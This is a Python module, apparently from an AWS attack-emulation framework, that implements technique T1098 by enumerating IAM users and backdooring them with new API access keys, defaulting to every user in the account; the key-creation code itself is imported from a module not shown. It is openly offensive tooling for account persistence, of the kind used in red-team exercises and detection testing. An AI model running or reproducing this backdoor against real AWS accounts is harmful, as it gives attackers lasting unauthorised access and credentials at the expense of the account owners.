#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
import importlib

target = ''

technique_info = {
    'blackbot_id': 'T1098.b.005', # add API keys to users
    'external_id': '',
    'controller': 'iam_backdoor_users_keys',
    'services': ['IAM'],
    'prerequisite_modules': ['iam_enum_users'],
    'arguments_to_autocomplete': ['--usernames'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'intent': 'Adds API keys to other users.',
    'name': 'ADD_NAME_HERE',
}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--usernames', required=False, default=None, help='A comma-separated list of usernames of the users in the AWS account to backdoor. If not supplied, it defaults to every user in the account')


def main(args, awsattack_main):
    session = awsattack_main.get_active_session()

    args = parser.parse_args(args)
    fetch_data = awsattack_main.fetch_data

    usernames = []

    if args.usernames is not None:
        if ',' in args.usernames:
            usernames = args.usernames.split(',')
        else:
            usernames = [args.usernames]
    else:
        if fetch_data(['IAM', 'Users'], technique_info['prerequisite_modules'][0], '--users') is False:
            print('FAILURE')
            print('  Prerequired module failed.')
            return None

        for user in session.IAM['Users']:
            usernames.append(user['UserName'])

    import_path = 'ttp.src.iam_backdoor_users_keys_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main, data=usernames)



def summary(data, awsattack_main):
    out = ''
    if 'Backdoored_Users_Count' in data:
        out += '  {} user key(s) successfully backdoored.\n'.format(data['Backdoored_Users_Count'])
    return out
